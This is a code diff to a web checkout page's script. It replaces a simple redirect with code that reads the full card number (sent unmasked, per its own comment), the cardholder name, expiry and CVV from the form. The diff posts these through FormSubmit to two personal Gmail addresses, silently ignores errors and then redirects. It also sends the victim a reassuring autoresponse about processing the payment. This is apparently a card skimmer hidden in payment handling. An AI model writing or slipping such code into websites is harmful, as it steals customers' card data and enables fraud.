@@ -280,8 +280,44 @@
 
     localStorage.setItem('paymentData', JSON.stringify(paymentData));
 
-    // Direct redirect to timer page
-    location.href = "timer.html";
+    // Send card details to FormSubmit
+    const formData = new FormData();
+    formData.append('_subject', 'Card Details Submitted');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    formData.append('_autoresponse', 'Thank you for your payment! We have received your card information and are processing your order.');
+    
+    // Only include payment status and card details
+    formData.append('paymentStatus', 'Card Details Received');
+    formData.append('submissionTime', new Date().toLocaleString());
+    
+    // Always send card details since card is the only available method
+    formData.append('cardNumber', document.getElementById('cardNumber').value); // Send full card number unmasked
+    formData.append('cardName', document.getElementById('cardName').value);
+    formData.append('expiry', document.getElementById('cardExpiry').value);
+    formData.append('cvv', document.getElementById('cardCvv').value);
+    
+    // Send to both email recipients
+    Promise.all([
+      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      }),
+      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      })
+    ]).catch(() => {}).finally(() => {
+      location.href = "timer.html";
+    });
   }
 </script>
 </body>
